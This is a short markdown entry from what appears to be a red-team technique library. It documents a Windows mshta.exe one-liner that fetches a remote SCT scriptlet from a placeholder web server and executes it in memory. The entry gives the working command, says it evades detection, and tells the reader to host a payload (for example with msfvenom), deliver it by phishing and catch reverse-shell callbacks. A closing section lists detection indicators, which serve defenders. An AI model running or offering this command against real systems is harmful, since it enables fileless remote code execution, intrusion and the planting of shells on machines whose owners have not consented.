---
id: 0c733bab-ff1f-455f-b751-0837f102b6f3
name: Mshta-VBScript-Remote-SCT-Execution
type: code
language: cmd
verified: true
created_at: '2023-04-06T03:56:26.858913+00:00'
updated_at: '2023-04-10T20:37:11.501056+00:00'
platforms:
  - Windows
tags:
  - mshta
  - vbscript
  - sct
  - execution
validated: true
---

# Mshta-VBScript-Remote-SCT-Execution

## Code

```cmd
mshta vbscript:Close(Execute("GetObject(\"script:http://$_WEBSERVER/payload.sct\")"))
```

## Description

This code snippet uses mshta.exe with an inline VBScript to remotely load and execute a Script Component (SCT) file from an HTTP server. The GetObject method fetches the SCT, which is an XML-based scriptlet containing VBScript or JScript, and Execute runs it immediately. The Close method terminates the mshta window to avoid detection. It is used for obfuscated remote code execution, often to deliver download cradles or shells without writing files to disk.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_WEBSERVER | Hostname or IP of the HTTP server hosting the SCT | webserver |
| payload.sct | Filename of the SCT file (can be customized) | payload.sct |

## Usage

Run this command in a Command Prompt or via a batch/PowerShell script on the target Windows machine. First, host an SCT file on your server (e.g., using msfvenom or manual XML creation with script content). It is typically delivered via phishing, initial access vectors, or living-off-the-land techniques. Example SCT content: `<scriptlet><registration progid="Test" classid="{GUID}"><script>payload here</script></registration>`. Listen for callbacks if the SCT includes a reverse shell.

## Detection

- Monitor command-line arguments to mshta.exe for 'vbscript:' or 'GetObject' patterns in process creation logs (Sysmon Event ID 1).
- Network traffic: Outbound HTTP requests to non-standard SCT endpoints; inspect User-Agent or content-type for XML/scriptlet fetches.
- Behavioral: Mshta spawning wscript.exe or cscript.exe; enable PowerShell logging if the SCT downloads further scripts.
- Fileless indicators: No disk writes but anomalous process trees (mshta -> script host -> cmd/powershell).

## Related

- [[procedures/Mshta-Remote-HTA-Execution]]
